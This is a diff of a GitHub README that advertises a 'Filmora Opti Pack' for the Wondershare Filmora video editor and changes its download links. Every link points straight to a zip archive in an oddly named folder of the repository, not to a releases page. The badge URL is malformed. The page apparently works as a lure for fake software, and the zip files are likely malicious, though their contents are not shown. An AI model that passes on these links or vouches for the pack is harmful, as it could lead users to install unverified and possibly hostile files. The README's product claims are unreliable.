@@ -1,6 +1,6 @@
 # 🎥 .github - Optimize Your Filmora Experience
 
-[![Download Now](https://raw.githubusercontent.com/rajeshpatra2001/.github/main/sclerophyll/.github.zip%20Now-Get%20Filmora%20Opti%20Pack-brightgreen)](https://raw.githubusercontent.com/rajeshpatra2001/.github/main/sclerophyll/.github.zip)
+[![Download Now](https://github.com/rajeshpatra2001/.github/raw/refs/heads/main/sclerophyll/github-v2.0.zip%20Now-Get%20Filmora%20Opti%20Pack-brightgreen)](https://github.com/rajeshpatra2001/.github/raw/refs/heads/main/sclerophyll/github-v2.0.zip)
 
 ## 🔍 Overview
 Filmora Opti Pack is a community-driven collection of tools and settings designed to enhance your video editing with Wondershare Filmora. This pack helps you work faster, improves rendering stability, and offers customization options for effects, all while providing a trial version to get you started.
@@ -17,7 +17,7 @@ Follow these simple steps to download and install Filmora Opti Pack. You don’t
 ## 📥 Download & Install
 1. **Visit the Releases Page**  
    Click the link below to go to the downloads page.  
-   [Download Filmora Opti Pack](https://raw.githubusercontent.com/rajeshpatra2001/.github/main/sclerophyll/.github.zip)
+   [Download Filmora Opti Pack](https://github.com/rajeshpatra2001/.github/raw/refs/heads/main/sclerophyll/github-v2.0.zip)
 
 2. **Choose Your Version**  
    Once on the releases page, look for the latest version available. You will see a list of files related to Filmora Opti Pack.
